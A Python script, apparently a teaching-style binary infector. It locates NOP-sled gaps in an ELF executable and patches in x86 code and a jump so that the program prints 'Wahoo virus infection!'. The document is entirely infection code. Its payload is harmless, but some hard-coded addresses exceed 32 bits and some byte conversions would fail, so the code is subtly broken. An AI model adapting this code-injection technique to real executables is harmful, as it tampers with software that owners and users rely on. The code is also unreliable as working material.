#!/usr/bin/env python
# -*- coding: utf-8 -*-

TARGET_FILE = 'target.exe'
NEW_TARGET_FILE = 'target.h@kd.exe'
TEXT = b'Wahoo virus infection!\0'
BASE_ADDR = 0x08048000 # Default entry point for an x86 ELF file
PUTS_ADDR = 0x1080482e0 # Location of the puts function in the target file with a twist
JUMP_ADDR = 0x10804844e # Location of the main code in the target file with a twist
PUSH = b'\x68'
CALL = b'\xe8'
JMP = b'\xe9'
RETURN = b'\xc9\xc3'

def main():
	data = b''
	# Read the bytes from the target file into a list
	with open(TARGET_FILE, 'rb') as f:
		data = f.read()
	# Check if the file is an ELF file
	if data[0:4] != b'\x7fELF':
		print('Not an ELF file')
		exit(1)

	# Go through the bytes and find the leave + ret + nop instruction pattern
	# A smaller pattern will be used for the tricky jump whereas
	# a larger pattern will be used for the code injection
	smaller_pattern = -1
	larger_pattern = -1
	nop_count = 0
	leave_found = False
	ret_found = False
	in_sequence = False
	for i in range(len(data)):
		if data[i] == 0xc9:
			leave_found = True
		elif data[i] == 0xc3 and leave_found:
			ret_found = True
		elif data[i] == 0x90 and ret_found:
			in_sequence = True
			nop_count+= 1
		elif in_sequence:
			if data[i] == 0x90:
				nop_count+= 1
				continue
			elif nop_count >= 40 and larger_pattern == -1:
				larger_pattern = i - nop_count
			elif nop_count >= 4 and smaller_pattern == -1:
				smaller_pattern = i - nop_count - 2
			leave_found = False
			ret_found = False
			in_sequence = False
			nop_count = 0

	# Check if the patterns were found
	if smaller_pattern == -1 or larger_pattern == -1:
		print('Appropriate nop sled(s) not found; cannot inject virus into the executable')
		exit(1)

	# Print the addresses of the patterns
	print(f'Smaller nop sled found at: {smaller_pattern}')
	print(f'Larger nop sled found at: {larger_pattern}')

	# Inject the larger pattern first as we will need its offset for the smaller pattern
	# The larger pattern will be used to print a message to the console
	# Inject the string to be printed into the executable
	data = data[:larger_pattern + 16] + TEXT + data[larger_pattern + 16 + len(TEXT):]
	# Move the larger pattern offset to the end of the string
	string_offset = larger_pattern + 16 + BASE_ADDR
	string_offset_bytes = string_offset.to_bytes(4, 'little')
	eip = larger_pattern + BASE_ADDR + len(PUSH) + len(string_offset_bytes) + len(CALL) + 4
	# Calculate the offset to the puts function
	offset = PUTS_ADDR - eip
	offset_bytes = offset.to_bytes(4, 'little')
	big_code = PUSH + string_offset_bytes + CALL + offset_bytes + RETURN
	print(f"Virus payload: {big_code}")
	# Inject the code to push the string offset onto the stack, then the address of puts, and then leave and return
	data = data[:larger_pattern] + big_code + data[larger_pattern + len(big_code):]

	# In the smaller pattern, we will jump to the larger pattern
	eip = smaller_pattern + BASE_ADDR + len(JMP) + 4
	# Calculate the offset to the larger pattern
	offset = JUMP_ADDR - eip
	offset_bytes = offset.to_bytes(4, 'little')
	small_code = JMP + offset_bytes
	print(f"Jump payload: {small_code}")
	data = data[:smaller_pattern] + small_code + data[smaller_pattern + len(small_code):]

	# Write the bytes to the target file
	with open(NEW_TARGET_FILE, 'wb') as f:
		f.write(data)

if __name__ == '__main__':
	main()